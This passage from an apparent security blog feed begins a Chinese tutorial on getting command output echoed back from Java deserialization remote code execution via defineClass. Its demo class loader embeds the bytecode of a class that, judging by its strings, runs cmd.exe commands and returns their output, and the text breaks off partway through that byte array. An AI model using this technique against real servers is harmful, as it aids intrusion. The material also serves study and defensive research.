class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/microsoft/terminal/blob/master/doc/cascadia/SettingsSchema.md" target="_blank" rel="noopener">https://github.com/microsoft/terminal/blob/master/doc/cascadia/SettingsSchema.md</a><br><a href="https://www.cnblogs.com/KiraYoshikage/p/11443741.html" target="_blank" rel="noopener">https://www.cnblogs.com/KiraYoshikage/p/11443741.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java 反序列化" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化链回显解决方案</title>
    <link href="https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2020-06-01T11:01:42.000Z</published>
    <updated>2021-01-18T06:18:54.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>&emsp;&emsp; 这是一篇本应该早就完成的文章，但是由于各种原因拖延至此。之前有读者就催我，但是实在是各种事情缠身，加上自己颓废了一段时间导致现在才公布。之后可能会断更一段时间关于代码审计方面文章，时间暂不确定。其实有几个题材早也确定，但是实在是没时间去整理素材，加上项目的更新，让我变得更加繁忙，在此给位先说一声对不起。</p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 大多数Java反序列化漏洞都能执行命令，导致RCE。小伙伴们有没有想过网络上大多数<code>payload</code>都是以弹计算机为止，但目标主机有没有弹计算机，或者执行其他的命令的时候我们是并不知道的，因为没有回显任何的结果。这篇文章以反序列化漏洞的回显为题，教你解决如何解决反序列化漏洞回显。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="defineclass异常回显"><a href="#defineclass异常回显" class="headerlink" title="defineclass异常回显"></a>defineclass异常回显</h1><p>&emsp;&emsp; defineclass是<code>java.lang.ClassLoader</code>类下的一个类方法，将字节码转化为Class类。<br><img src="https://img-blog.csdnimg.cn/20200605103739371.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200605103901837.png" alt="在这里插入图片描述"></p><hr><h2 id="ClassLoder-类加载机制"><a href="#ClassLoder-类加载机制" class="headerlink" title="ClassLoder 类加载机制"></a>ClassLoder 类加载机制</h2><p>&emsp;&emsp; Java是一个依赖于JVM(Java虚拟机)实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，ClassLoader会调用JVM的native方法(defineClass0/1/2)来定义一个java.lang.Class实例。</p><p><img src="https://img-blog.csdnimg.cn/20200524095720286.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 类加载器有三个，根加载器<code>Bootstrap</code>、平台类加载器<code>PlatformClassLoader</code>以及用户类加载器<code>AppClassLoader</code>。用户也可以自定义类加载器，自定义的类加载器需要继承<code>ClassLoader</code>类。</p><p><img src="https://img-blog.csdnimg.cn/20200524110624558.png" alt="在这里插入图片描述"></p><hr><h2 id="类加载demo"><a href="#类加载demo" class="headerlink" title="类加载demo"></a>类加载demo</h2><p>&emsp;&emsp; 下面给出的是一个完整的用户自定义加载器加载类字节码的DEMO，Summer类字节码怎么获取下文会讲解，目前先看一下类加载器的实现。</p><blockquote><p>温馨提示：如果使用笔者在GitHub上项目，请先将Summer类删除，或者移到其他地方。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summer类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// Summer.class类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">103</span>, <span class="number">98</span>, <span class="number">107</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">102</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">78</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span 